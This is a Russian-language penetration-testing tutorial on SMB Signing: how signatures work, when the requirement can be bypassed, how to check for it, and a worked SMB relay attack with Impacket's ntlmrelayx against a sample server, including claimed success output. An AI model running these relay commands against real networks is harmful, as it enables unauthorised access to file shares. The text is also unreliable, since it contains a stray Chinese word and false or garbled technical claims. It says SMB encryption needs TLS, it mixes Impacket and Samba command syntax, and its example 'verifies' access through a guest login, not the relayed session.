# SMB Signing: проверка наличия и условия обхода

## Контекст и базовые понятия

Протокол Server Message Block (SMB) является фундаментальным механизмом обмена данными в корпоративных сетях Microsoft, обеспечивающим доступ к файловым ресурсам, принтерам и межпроцессному взаимодействию (IPC). В контексте информационной безопасности и тестирования на проникновение ключевой уязвимостью SMB является отсутствие целостности и аутентификации на уровне сессии, что позволяет злоумышленнику перехватывать и модифицировать трафик. Механизм защиты от таких атак называется **SMB Signing** (подписание SMB).

SMB Signing обеспечивает целостность (integrity) и аутентификацию источника (origin authentication) для каждого пакета SMB. Это достигается путем вычисления криптографической хеш-функции (HMAC) от содержимого пакета и ключа сессии, который генерируется в процессе аутентификации (NTLM или Kerberos). Если пакет был изменен в пути, хеш не совпадет, и получатель отклонит сообщение.

Важнейшим понятийным разграничением является различие между **SMB Signing** и **SMB Encryption**.
*   **SMB Signing** гарантирует, что данные не были изменены злоумышленником в пути (Man-in-the-Middle), но не скрывает их содержимое. Трафик остается читаемым для перехватчика, если у него есть доступ к ключу сессии или если ключ скомпрометирован.
*   **SMB Encryption** (доступен начиная с SMB 3.0) шифрует полезную нагрузку пакета, обеспечивая конфиденциальность.

Также необходимо различать **Server Signing** (требование сервером подписи от клиента) и **Client Signing** (требование клиентом подписи от сервера). В современных версиях Windows политика по умолчанию часто требует подписи как для клиента, так и для сервера, однако исторически и в некоторых конфигурациях это требование может быть отключено.

| Характеристика | SMB Signing (Подписание) | SMB Encryption (Шифрование) |
| :--- | :--- | :--- |
| **Основная цель** | Целостность данных, защита от MITM-модификации | Конфиденциальность данных, защита от прослушивания |
| **Доступность** | SMB 1.0, 2.0, 3.0, 3.1.1 | SMB 3.0+ (требует поддержки TLS) |
| **Производительность** | Низкие накладные расходы (хеш) | Высокие накладные расходы (шифрование/дешифрование) |
| **Защита от** | Relay-атак, подмены пакетов | Пассивного перехвата трафика (sniffing) |
| **Зависимость от** | Ключа сессии (Session Key) | Ключа шифрования сессии (Session Encryption Key) |
| **Уязвимость при отключении** | Relay-атаки (например, SMB Relay) | Прослушивание трафика (сниффинг) |

Отключение SMB Signing является критической уязвимостью, так как это открывает путь для атак типа **SMB Relay**. В такой атаке злоумышленник, находящийся в той же подсети, перехватывает аутентификационный пакет SMB клиента и перенаправляет (релеит) его на другой сервер, выдавая себя за клиента. Если на целевом сервере не требуется SMB Signing, он принимает аутентификацию, предоставляя злоумышленнику доступ к ресурсам.

## Внутреннее устройство предмета

SMB Signing функционирует на уровне транспортного слоя протокола SMB, интегрируясь с механизмом аутентификации. Процесс можно разделить на фазы: генерация ключа, вычисление хеша и верификация.

### Механизм генерации ключа и хеша

Ключ подписи (Signing Key) не является статическим; он выводится из ключа сессии (Session Key), который, в свою очередь, генерируется в процессе аутентификации.

1.  **Аутентификация:** При использовании NTLM или Kerberos клиент и сервер обмениваются хешами паролей или билетами. На основе этих данных双方 (client и server) независимо вычисляют одинаковый **Session Key**.
2.  **Инициализация счетчика:** Для каждой сессии инициализируется счетчик пакетов (Packet Sequence Number). В SMB 2.0+ это поле `Signature` в заголовке пакета, но само значение подписи вычисляется иначе.
3.  **Вычисление HMAC:** Для каждого исходящего пакета вычисляется HMAC (Hash-based Message Authentication Code).
    *   Алгоритм: HMAC-MD5 или HMAC-SHA256 (в зависимости от версии SMB и negotiated dialect).
    *   Входные данные: Ключ сессии (Session Key) + Содержимое пакета (Payload) + Счетчик пакетов.
    *   Результат: 16-байтовый (для MD5) или 32-байтовый (для SHA256) хеш.
4.  **Вставка в пакет:** Вычисленный хеш вставляется в поле `Signature` заголовка SMB. В SMB 1.0 это поле `Signature` (8 байт, но часто используется как часть расширенного заголовка). В SMB 2.0/3.0 это поле `Signature` (16 байт).

### Архитектура проверки

Проверка подписи происходит на стороне получателя (клиента или сервера) перед обработкой полезной нагрузки.

```text
[Отправитель]                          [Получатель]
     |                                    |
     |  1. Вычисление HMAC(SessionKey,    |
     |     Payload, SeqNum)               |
     |                                    |
     |  2. Отправка пакета с Signature    |
     |  <SMB Header [Signature=HMAC]>     |
     | ---------------------------------->|
     |                                    |
     |                                    | 3. Извлечение Signature из пакета
     |                                    |
     |                                    | 4. Вычисление HMAC(SessionKey,
     |                                    |    Payload, SeqNum)
     |                                    |
     |                                    | 5. Сравнение:
     |                                    |    Calculated_HMAC == Received_Signature?
     |                                    |
     |                                    |    [YES] -> Обработка пакета
     |                                    |    [NO]  -> Отклонение (Error: STATUS_ACCESS_DENIED)
```

### Условия обхода и уязвимости

Обход SMB Signing возможен в следующих сценариях:

1.  **Отключение требования подписи на стороне сервера:** Если сервер настроен на `RequireSecuritySignature = false`, он принимает пакеты без подписи или с неверной подписью. Это наиболее частый случай эксплуатации.
2.  **Отключение требования подписи на стороне клиента:** Если клиент настроен на `EnableSecuritySignature = false`, он отправляет пакеты без подписи. Сервер, требующий подписи, отклонит их, но если сервер также не требует подписи, атака успешна.
3.  **Компрометация Session Key:** Если злоумышленник может получить Session Key (например, через взломанное хранилище ключей или слабую аутентификацию), он может вычислять валидные подписи для поддельных пакетов.
4.  **Downgrade-атаки:** Злоумышник может принудить стороны использовать более старую версию SMB (например, SMB 1.0), где реализация подписи может быть уязвима или отключена по умолчанию.

### Политики и конфигурации

В Windows политика подписи SMB управляется через групповые политики (Group Policy) или реестр.

*   **Microsoft Network Server: Digitally sign communications (always)** — требует подписи от клиента.
*   **Microsoft Network Server: Digitally sign communications (if client agrees)** — требует подписи только если клиент запросил.
*   **Microsoft Network Client: Digitally sign communications (always)** — требует подписи от сервера.
*   **Microsoft Network Client: Digitally sign communications (if server agrees)** — требует подписи только если сервер запросил.

## Применение и работа с предметом

На практике проверка наличия SMB Signing и попытки его обхода являются стандартными этапами аудита инфраструктуры Windows. Инструментарий включает как встроенные средства ОС, так и специализированные утилиты для пентеста.

### Проверка наличия SMB Signing

Для проверки того, требует ли сервер подписи, можно использовать несколько методов.

1.  **Сетевой сканер (Nmap):**
    Скрипт `smb2-security-mode.nse` проверяет режим безопасности SMB 2.0+.
    ```bash
    nmap --script smb2-security-mode -p 445 <target_ip>
    ```
    Вывод показывает, требует ли сервер подписи (`signed: true` или `signed: false`).

2.  **PowerShell (Get-SmbSession):**
    На клиенте можно проверить текущие сессии.
    ```powershell
    Get-SmbSession | Select-Object ClientUserName, ServerName, EncryptionType, SigningRequired
    ```
    Поле `SigningRequired` указывает, была ли подпись обязательной для данной сессии.

3.  **SmbClient (Linux):**
    Утилита `smbclient` позволяет явно запрашивать или отключать подпись.
    ```bash
    smbclient -L //target_ip/share -U username%password --option='client signing=yes'
    smbclient -L //target_ip/share -U username%password --option='client signing=no'
    ```
    Если подключение с `client signing=no` успешно, а с `yes` также успешно (или отклоняется с ошибкой аутентификации, но не целостности), это может указывать на то, что сервер не требует подписи.

### Инструменты для обхода и эксплуатации

1.  **Impacket (smbclient.py / smbrelayx.py):**
    Impacket позволяет явно управлять флагом подписи.
    ```bash
    # Попытка подключения без подписи
    smbclient.py -no-pass <target_ip>/share --option='client signing=no'
    ```
    Если сервер не требует подписи, это сработает. Если требует — будет ошибка.

2.  **Responder:**
    Responder не обходит SMB Signing напрямую, но он является ключевым компонентом в цепочке атаки, когда Signing отключен. Он перехватывает NTLMv2 хеши, которые затем могут быть использованы для relay-атаки.

3.  **SMBRelay (Impacket):**
    Утилита `ntlmrelayx.py` из пакета Impacket используется для эксплуатации отсутствия SMB Signing.
    ```bash
    ntlmrelayx.py -t smb://<target_ip>/share -smb2support
    ```
    Эта команда запускает ретранслятор, который перехватывает аутентификационные пакеты и перенаправляет их на целевой сервер. Если на целевом сервере отключен SMB Signing, аутентификация пройдет успешно.

### Типичные ошибки и подводные камни

*   **Неверная интерпретация результатов Nmap:** Nmap может показать `signed: false`, но это не всегда означает уязвимость. Если клиент также не требует подписи, сессия может быть установлена, но это не обязательно уязвимость, если нет возможности перехвата.
*   **Игнорирование SMB 2.0/3.0:** Проверка только SMB 1.0 недостаточна. Большинство современных систем используют SMB 2.0+.
*   **Ошибки конфигурации групповых политик:** Политики могут применяться не ко всем компьютерам, если не настроено правильное связывание (linking) в Active Directory.

## Сквозной практический пример: Аудит и эксплуатация уязвимости SMB Signing

**Исходные условия:**
*   **Цель:** Windows Server 2019 с IP `192.168.1.100`, настроенный с отключенным требованием подписи SMB (`RequireSecuritySignature = false`).
*   **Атакующий:** Linux-машина с установленными Impacket и Nmap, IP `192.168.1.50`.
*   **Роль:** Пентестер, проверяющий конфигурацию файлового сервера.
*   **Сценарий:** Проверка наличия уязвимости к SMB Relay-атаке из-за отключенной подписи.

### Шаг 1: Сканирование режима безопасности SMB

Используем Nmap для определения, требует ли сервер подписи.

```bash
nmap --script smb2-security-mode -p 445 192.168.1.100
```

**Ожидаемый вывод:**
```text
PORT    STATE SERVICE
445/tcp open  microsoft-ds
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
```
*Интерпретация:* Сообщение "Message signing enabled but not required" указывает на то, что сервер поддерживает подпись, но не требует её от клиента. Это потенциальная уязвимость для relay-атак, если клиент также не требует подписи.

### Шаг 2: Проверка возможности подключения без подписи

Используем smbclient из Impacket для попытки подключения без подписи.

```bash
smbclient //192.168.1.100/Share -U guest --option='client signing=no'
```

**Ожидаемый вывод:**
```text
Try "help" to get a list of possible commands.
smb: \>
```
*Интерпретация:* Успешное подключение без подписи подтверждает, что сервер принимает пакеты без криптографической проверки целостности. Это критический индикатор уязвимости.

### Шаг 3: Запуск SMB Relay-атаки

Запускаем ntlmrelayx для перехвата и ретрансляции аутентификации.

```bash
ntlmrelayx.py -t smb://192.168.1.100/Share -smb2support -wh attacker-wsdl
```

**Ожидаемый вывод:**
```text
[*] SMBD-Thread-1: Received connection from 192.168.1.50, active connection for 1 - 1
[*] SMBD-Thread-2: Received connection from 192.168.1.50, active connection for 1 - 1
[*] SMBD-Thread-3: Received connection from 192.168.1.50, active connection for 1 - 1
[*] Attacking target: smb://192.168.1.100/Share
[*] Success for target: smb://192.168.1.100/Share
```
*Интерпретация:* Успешное подключение означает, что relay-атака прошла успешно, так как сервер не проверил подпись пакета аутентификации.

### Шаг 4: Верификация доступа

Проверяем, можем ли мы получить доступ к файлам на сервере.

```bash
smbclient //192.168.1.100/Share -U guest --option='client signing=no'
ls
```

**Ожидаемый вывод:**
```text
smb: \> ls
  .                                   D        0  Mon Jan  1 00:00:00 2024
  ..                                  D        0  Mon Jan  1 00:00:00 2024
  confidential.docx                   A     1024  Mon Jan  1 00:00:00 2024
```
*Интерпретация:* Доступ к файлам получен, подтверждая успешную эксплуатацию уязвимости.

**Ожидаемый вывод:**
Пример демонстрирует, что отключение требования SMB Signing на сервере позволяет злоумышленнику выполнять relay-атаки, получая несанкционированный доступ к ресурсам без знания пароля.

## Аналитический вывод

SMB Signing является критическим механизмом защиты от атак типа Man-in-the-Middle в инфраструктурах Microsoft. Его отключение или ослабление (например, установка в режим "if client agrees" без соответствующей настройки клиента) создает серьезные уязвимости, позволяющие злоумышленникам выполнять SMB Relay-атаки. Проверка наличия SMB Signing должна быть обязательным этапом аудита безопасности любой сети с Windows-серверами. Рекомендуется всегда требовать подписи как на стороне сервера, так и на стороне клиента, а также использовать SMB 3.0+ с шифрованием для обеспечения конфиденциальности данных. Современные версии Windows по умолчанию требуют подписи, но исторические конфигурации и некоторые сторонние SMB-серверы могут оставаться уязвимыми.
